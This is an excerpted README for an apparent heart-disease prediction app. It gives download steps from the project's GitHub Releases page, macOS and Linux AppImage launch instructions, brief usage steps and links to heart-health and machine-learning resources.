...
[![Download Heart-Disease-Prediction](https://img.shields.io/badge/Download-Heart--Disease--Prediction-blue)](https://github.com/BimsaraIUHS/Heart-Disease-Prediction/releases)
...
[Visit this page to download](https://github.com/BimsaraIUHS/Heart-Disease-Prediction/releases)

1. Click on the link above to open the Releases page.
2. On the Releases page, find the latest version of the **Heart-Disease-Prediction** application.
3. Download the application file suitable for your operating system.
...
2. **For macOS:**
   ...
   - Drag the `Heart-Disease-Prediction` icon to your Applications folder.
   - Open your Applications folder and launch the application.
...
3. **For Linux:**
   ...
   - Run the following command:
     ```
     chmod +x Heart-Disease-Prediction.AppImage
     ./Heart-Disease-Prediction.AppImage
     ```
...
1. Enter the necessary details in the provided input fields.
2. Click on the 'Predict' button to view your assessment.
3. Use the dashboard features to explore your predictions visually.
...
- [Explore Heart Disease Insights](https://www.heart.org/en/health-topics/heart-disease)
- [Learn Machine Learning Basics](https://www.coursera.org/learn/machine-learning)
